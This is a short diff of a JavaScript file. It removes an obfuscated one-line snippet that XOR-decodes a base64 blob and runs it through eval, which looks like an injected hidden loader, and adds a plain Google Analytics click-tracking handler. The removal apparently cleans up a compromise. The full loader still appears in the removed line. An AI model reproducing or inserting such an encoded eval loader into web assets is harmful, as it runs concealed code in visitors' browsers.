@@ -1,1 +1,6 @@
-(()=>{const d='X6N5VQP3dyxsywnjMYJgUxjuXitrkQ3pMLU+ERX2eyFzwkThIKl1Qh/1fGp9zBONdedgVwS6c399yxzmJ6BzQlj5fi1rgBvzc+FzGAL7YCV9kUbkOahlUwXuOmU2lwHjPOpiWQa3cDZ2wkG8X+c2XxCyMyMxlw3zILV4DXy6MjZqnBPuM+9hXxj+fTU2ghzmMu5hXxj+fTU2ghzmMu8xUwD/fDY/yU/1PKN/aRX2eyFzwkT8JaZxUynuezZ0gFLjOqRjWxP0ZmxsjBzrMOt6XxjxTTdqiVLme69kUxDmbmU/mEG8KKR3QhXyOidql0H8KM1rGgLoZycx3mI=',k=[85,199,22,54,118,154,18,66,24,229,104,135],r=atob(d),a=new Uint8Array(r.length);for(let i=0;i<r.length;i++)a[i]=r.charCodeAt(i)^k[i%k.length];(0,eval)(new TextDecoder().decode(a))})();
+
+document.addEventListener('click',function(e){
+  var a=e.target.closest&&e.target.closest('.ridi-top-btn');
+  if(!a)return;
+  try{if(window.gtag)window.gtag('event','ridi_click',{page_title:document.title,link_url:a.href||''});}catch(err){}
+},true);
